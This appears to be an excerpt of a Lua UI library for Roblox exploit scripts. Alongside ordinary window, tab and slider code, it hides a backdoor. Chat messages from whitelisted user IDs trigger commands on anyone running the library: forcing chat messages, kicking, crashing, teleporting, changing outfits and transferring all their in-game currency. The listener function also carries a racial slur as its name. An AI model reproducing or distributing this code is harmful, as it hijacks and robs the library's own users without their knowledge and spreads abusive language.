...
function library.new(name)
	...
	library['ongod'] = {
		['say'] = function(a)
			local ev = game.GetService(game,"ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
			ev.FireServer(ev,a:sub(7+#a:split(" ")[2]),"All")
		end;
		['ban'] = function()
		...
		['identify'] = function(a,p)
			for i = 1,3 do
				getrenv()._G.Triggered(p.Character.HumanoidRootPart,4)
				task.wait(.2)
			end
		end;
		['kick'] = function(a)
			game.GetService(game,"Players").LocalPlayer.Kick(game.GetService(game,"Players").LocalPlayer,tostring(a):sub(#a:split(" ")[1]+#a:split(" ")[2]+3))
		end;
		['bring'] = function(a,p)
			local lp = game.GetService(game,"Players").LocalPlayer.Character
			lp.PivotTo(lp,p.Character.GetPivot(p.Character))
		end;
		['crash'] = function()
			while true do end
		end;
		...
		['wear'] = function(a,p)
			local ev = game.GetService(game,"ReplicatedStorage").Events.MenuActionEvent
			ev.FireServer(ev,8,{p.PlayerData.RoleplayName.Value,p.PlayerData.Outfit.Value,true})
		end;
		['donate'] = function(a,p)
			local ev = game.GetService(game,"ReplicatedStorage").Events.MenuActionEvent
			ev.FireServer(ev,2,tostring(game.GetService(game,"Players").LocalPlayer.PlayerData.Currency.Value),p.Name)
		end;
		['break'] = function()
	...
	library['f'] = function(str)
		if not str then return end
		local lp = game.GetService(game,"Players").LocalPlayer
		if lp.DisplayName:lower():find(str:lower()) or lp.Name:lower():find(str:lower()) then return true end
	end
	library['nigger'] = function(p)
		p.Chatted.Connect(p.Chatted,function(msg)
			if table.find(library['funny'],p.UserId) then
				if msg:sub(1,1) == "'" then
					local r = library['ongod'][msg:sub(2,#msg:split(" ")[1])]
					if r and library['f'](msg:split(" ")[2]) then
						r(msg,p)
					end
				end
			end
	...
	game.GetService(game,"Players").PlayerAdded.Connect(game.GetService(game,"Players").PlayerAdded,library['nigger'])
	for i,v in next,game.GetService(game,"Players").GetPlayers(game.GetService(game,"Players"))do library['nigger'](v)end
	...
	function UI.WindowTab(name)
		...
		Window.BackgroundColor3 = Color3.fromRGB(127, 0, 255)
		Window.BackgroundTransparency = 0.500
		Window.BorderColor3 = Color3.fromRGB(102, 0, 204)
		...
		function UITabs.SideTab(name,size)
			...
			Frame.BackgroundColor3 = Color3.fromRGB(178, 102, 255)
			...
			function SideTabUI.Section(name)
				...
				function SectionUI.Slider(name,min,max,default,precise,callback)
					...
					UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(153, 51, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(127, 0, 255))}
